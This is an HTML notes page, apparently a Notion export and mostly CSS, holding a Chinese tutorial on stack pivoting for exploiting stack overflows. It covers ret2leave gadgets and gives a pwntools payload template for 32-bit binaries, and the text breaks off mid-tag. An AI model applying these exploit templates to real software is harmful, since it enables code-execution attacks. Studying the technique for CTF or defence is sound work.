@@ -1,0 +1,812 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>栈迁移</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="912973dc-709b-4459-9983-c7ba598d26ac" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1604537529428-15bcbeecfe4d?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">🛹</span></div><h1 class="page-title">栈迁移</h1><p class="page-description"></p></header><div class="page-body"><blockquote id="8fa34e95-53ef-4b39-8721-a164e501184e" class="">“你说爱就好比世间最锋利的凶器”</blockquote><p id="7080ed5c-3ec9-4e15-aff5-2e36259646af" class="block-color-teal_background">有两种栈迁移方式：<div class="indented"><p id="843d6b0d-8795-46aa-96d6-94eeffaf6351" class="">1、ret2leave实现栈迁移</p><p id="94d38070-6b6d-4dfb-b118-8b27ab52c1af" class="">2、SROP实现栈迁移</p></div></p><p id="feb43b89-e7df-40ec-ae9d-211a9638323f" class="block-color-teal_background">栈迁移的意义：<div class="indented"><p id="b14618a1-03c9-41c7-b4dd-05672e14a5c5" class="">1、扩大栈大小</p><p id="e0044006-db31-41e7-8664-dd1ff11d34f6" class="">2、获得栈基址以便于向栈中更好地写入指针</p></div></p><h1 id="74620005-a8cb-42b5-8335-cd860305bed7" class="">一、ret2leave实现栈迁移</h1><h3 id="656d8cbe-8830-4946-bea8-f834d11d3333" class="">1-定义</h3><p id="b282484e-eb72-441d-9a79-2efd52a7b857" class="">栈迁移的意义：</p><p id="bf48ce44-99e9-4531-a83d-a22a93410eb9" class="">1、扩大栈大小</p><p id="c02e149d-0d39-4072-84d0-f7bd7b889b45" class="">2、获得栈基址以便于向栈中更好地写入指针</p><h3 id="284a92c4-5684-4f6c-99ee-51dd8df2cc58" class="">2-条件</h3><p id="8dc77054-ecf6-48b8-86e8-aef00eba9577" class=""><mark class="highlight-teal">需要至少能注入6块有效位（含ebp）</mark></p><h3 id="d527823c-e821-41e6-821e-4a82cf5b43a3" class="">3-思路</h3><ul id="92e851f8-8077-485a-839e-62575343e75e" class="toggle"><li><details open=""><summary>思路1：通过pop_rbp_ret+leave_ret实现栈迁移(思路更简单，需要8有效位，推荐！)</summary><h3 id="9853f9fd-aa0c-4afd-bb0b-4c30a383b034" class="">条件</h3><p id="d929fc81-4504-4357-8c7f-9de0d149c334" class="">需要8块有效位(不含ebp)</p><h3 id="5d436ea3-d3f9-49d3-a408-f36a003364a7" class="">基础知识</h3><p id="48615d8a-9a9f-4c97-8679-cc702cf5a8db" class="">leave指令相当于</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0524d52b-8c24-47d6-a558-f91458229957" class="code"><code class="language-C">mov esp,ebp
+pop ebp</code></pre><h3 id="7627dc28-f8df-4497-815e-d3f730f6bcfe" class="">思路+模板</h3><p id="55e1a51b-5b55-4e6b-b981-c381b908c69c" class="">1、首先是利用链以栈溢出开始：</p><p id="12928e1c-ae94-4a97-adc6-5da87a790838" class="">书写payload1，结构如下：</p><figure id="0523c66e-d199-42da-a04e-24ad0602e71b" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled.png"><img style="width:528px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled.png"/></a></figure><p id="93e1cdde-1121-498d-9cf1-0dddc36f7d87" class="">2、然后是read函数接收payload2向bss写入东西，写入我们想要的东西后(注意在base_bss_addr的前两个块要写一个“合理的ebp”+”下一步的劫持执行的retaddr”)</p><p id="bb1db600-9702-4a4b-913d-f44e5fa33ce4" class="">然后read执行完就会执行到刚刚payload1注入的“栈迁移代码”，其中pop_rbp_ret是设置ebp为了后续把这个值给到esp，然后后续的leaveret里面：</p><p id="543289e7-2ef3-43a7-aafe-9db8cc82c8c0" class="">（1）mov esp,ebp设置了esp指向迁移后的栈顶</p><p id="4cea28ea-46d0-487f-8025-b54ecabd4d22" class="">（2）pop ebp结合payload2的“合理的ebp”设置了ebp指向迁移后的栈底</p><p id="9f454b09-e680-4e16-b328-33afa790ebe6" class="">（3）ret结合payload2的“下一步的劫持执行的retaddr”设置了下一步的劫持链</p><blockquote id="77db98e9-660b-43dc-8152-22dd1beefe64" class="">注意，这里的“(2)”，可以直接设置为0<p id="36f633b6-a3a7-4748-8f5b-b163699a812f" class="">因为你后面rop链去劫持执行gadget不涉及ebp，rop链去劫持执行函数也只是“保存旧esp取出旧ESP”和“保存旧ebo取出旧ebp”两个相互独立的过程，前者涉及新ebp，但是和旧ebp无关不会因为旧ebp被改变而被影响</p></blockquote><h3 id="5eede02e-0137-467e-aa55-9be04885e4ca" class="">代码示例</h3><p id="4cd2cc1e-c941-4d88-aff2-31caedb37499" class="">1、x32下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5ab1dda6-406e-4858-b37f-4baf6e2258a5" class="code"><code class="language-Python">payload1  = b&quot;A&quot; * 112 + p32(read_plt) + p32(pop3ret) + p32(0) + p32(base_addr) + p32(100)
+payload1 += p32(pop_ebp_ret) + p32(base_addr)
+payload1 += p32(leave_ret_addr)
+io.send(payload1)
+
+payload2 = b&quot;AAAA&quot;                 #ebp这里可以随便填~
+payload2 += p32(下一个要ret到的地方)
+payload2 += ...                    #后续的利用代码
+io.send(payload2)
+</code></pre><p id="50f552c4-ec30-4de4-9b69-47859ec3b9b1" class="">2、x64下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ee869b0a-fcce-461d-9e9b-971a6d2cd48e" class="code"><code class="language-Python"></code></pre></details></li></ul><ul id="cf1ad3c9-1136-4cfc-bf94-ea4b90dfe76e" class="toggle"><li><details open=""><summary>思路2：通过连续两个leave实现栈迁移(在栈上写的内容更少)</summary><h3 id="bbe37bf0-a060-4e14-8b91-b8852141b2bb" class="">基本知识</h3><p id="8e34e13a-5745-49f0-a53c-6f2d0ed04131" class=""><strong>1、核心原理就是leave指令，它相当于</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c9a87030-1769-4e47-ba52-7a8fb41ae214" class="code"><code class="language-Python">mov esp,ebp
+pop ebp</code></pre><p id="7f8d0f4e-c48b-424a-8411-4e597d9509de" class="">也就是把esp指向到ebp处，然后再按照栈上地址设置ebp的指向</p><p id="e1120367-cd44-4100-90b7-f4591edd06a2" class="">如果我们连续地使用两次leave，就可以实现：第一次leave设置了ebp的位置，第二次leave把esp丢到ebp处</p><p id="11214c2b-8ae5-46c4-ba96-b40d6e48cc3e" class=""><strong>2、函数栈帧的决定者是esp，ebp是中间的打工仔</strong></p><p id="1cd05f57-a753-457c-8d96-c17152c287ed" class="">在执行函数时，因为函数要用ebp相对寻址获得函数传参和记录函数栈基址，那就esp把ebp“召之即来”（即函数开头的push ebp;mov ebp,esp;）再执行函数后，因为ebp用不到了，esp就对其“呼之即去”（即函数结尾的leave;ret）</p><p id="ef280497-c552-4c18-a225-39b7d4f26e8c" class="">而在呼之即去后还未召之即来的这一段时间（我称之为下班）中，ebp在哪里不重要，而召之即来又取决于esp（我称之为老板）。所以结论就是：ebp下班后平时住在哪里并不影响程序的运行，但是在他上班时（函数执行时）他在哪里就很重要，栈迁移的重点是把握esp（老板）的迁移，给老板一个好位置，再配置好公司的资源（传参返回值），然后至于esp下班后住的员工宿舍，随便配一个就好。</p><h3 id="803e2a3d-831d-4f2a-bd07-bcf40c110228" class="">思路+模板</h3><p id="fc238fbc-b4c9-47e7-ac07-1a35d01f24c2" class=""><strong>1、考虑一次栈迁移的情况</strong></p><p id="365fc136-237d-4372-8ea8-bbab147e2079" class=""><mark class="highlight-pink"><strong>read函数本身也有一次leaveret</strong></mark></p><p id="5863cff1-99c8-4003-88db-ba02f8a7f48a" class="">首先，我们可以通过一个模板代码构造如下结构： </p><figure id="576a8e88-7d7b-4e01-84fd-53c48034e8c2" class="image" style="text-align:left"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%201.png"><img style="width:384px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%201.png"/></a></figure><p id="4b5b2d38-7475-4155-818a-195c81284f68" class="">模板代码大概就分为这么四步：<div class="indented"><p id="84fa03c6-02bb-481a-8f0c-d7a9944326fd" class="">1）在栈上要pop ebp的那块地方写上bss+0x300地址用于（2）的leave</p><p id="82240394-82aa-4274-b27e-9e9baafafe3b" class="">2）先来一次leave，让esp指向栈上的ebp处，然后ebp在pop时就会去指向到bss+0x300处</p><p id="cc2e0689-5a34-4c62-9d61-2f36b362409f" class="">3）在bss上要pop ebp的那块地方写上bss+0x600处地址用于（4）的leave，然后再填上要ret向的函数地址和要ret到的那个函数的传参和返回地址和目标ebp</p><p id="a6e83acb-126e-4c34-9450-e2b39944a04f" class="">4）再来一次leave，让esp指向bss上的ebp处（即bss+200处），然后ebp在pop时就会去指向到bss+400处，接下来就是ret，就会ret2那个函数地址，然后传参是相对ebp的，也做到了，完美！</p></div></p><ul id="55855911-1631-43b0-a486-43fd3bffea4f" class="toggle"><li><details open=""><summary>模板内容如下</summary><p id="8c4a03a0-b52c-4d53-84fc-29098cf8eb42" class="">对于以下代码：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 